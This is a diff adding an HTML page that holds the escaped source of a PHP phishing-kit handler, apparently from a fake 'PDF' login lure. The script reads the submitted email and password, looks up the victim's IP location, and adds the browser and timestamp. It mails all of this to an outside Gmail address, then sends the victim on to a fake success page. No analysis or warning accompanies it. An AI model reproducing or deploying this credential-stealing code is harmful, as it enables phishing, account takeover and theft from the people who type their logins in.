@@ -1,0 +1,35 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title></title>
+</head>
+<body>
+&lt;?php<br/>
+$login = $_POST[&#39;login&#39;];<br/>
+require_once(&#39;./geoplugin.class.php&#39;);<br/>
+$geoplugin = new geoPlugin();<br/>
+$geoplugin&ndash;&gt;locate();<br/>
+$date = gmdate (&quot;Y&ndash;n&ndash;d&quot;);<br/>
+$time = gmdate (&quot;H:i:s&quot;);<br/>
+$browser = $_SERVER[&#39;HTTP_USER_AGENT&#39;];<br/>
+$message .= &quot;=============+ LOGS +=============\n&quot;;<br/>
+$message .= &quot;username: &quot;.$_POST[&#39;frm&ndash;email&#39;].&quot;\n&quot;;<br/>
+$message .= &quot;Password: &quot;.$_POST[&#39;frm&ndash;pass&#39;].&quot;\n&quot;;<br/>
+$message .= &quot;============= [ Loc Info ] =============\n&quot;;<br/>
+$message .= 	&quot;IP: {$geoplugin&ndash;&gt;ip}\n&quot;;<br/>
+$message .= 	&quot;City: {$geoplugin&ndash;&gt;city}\n&quot;;<br/>
+$message .= 	&quot;Region: {$geoplugin&ndash;&gt;region}\n&quot;;<br/>
+$message .= 	&quot;Country Name: {$geoplugin&ndash;&gt;countryName}\n&quot;;<br/>
+$message .= 	&quot;Country Code: {$geoplugin&ndash;&gt;countryCode}\n&quot;;<br/>
+$message .= 	&quot;User&ndash;Agent: &quot;.$browser.&quot;\n&quot;;<br/>
+$message.= &quot;Date Log  : &quot;.$date.&quot;\n&quot;;<br/>
+$message.= &quot;Time Log  : &quot;.$time.&quot;\n&quot;;<br/>
+<br/>
+<br/>
+$domain = &#39;0&ndash;3L0ck SAVAGE&#39;;<br/>
+$subj = &quot;SAVAg3 PDF result | $login&quot;;<br/>
+$from = &quot;From: $domain&lt;west&gt;\n&quot;;<br/>
+mail(&quot;	ve.hiring@gmail.com&quot;,$subj,$message,$from,$domain);<br/>
+<br/>
+header(&quot;Location: success.php?cmd=login_submit&amp;id=$praga$praga&amp;session=$praga$praga&quot;);<br/>
+?&gt;</body></html>
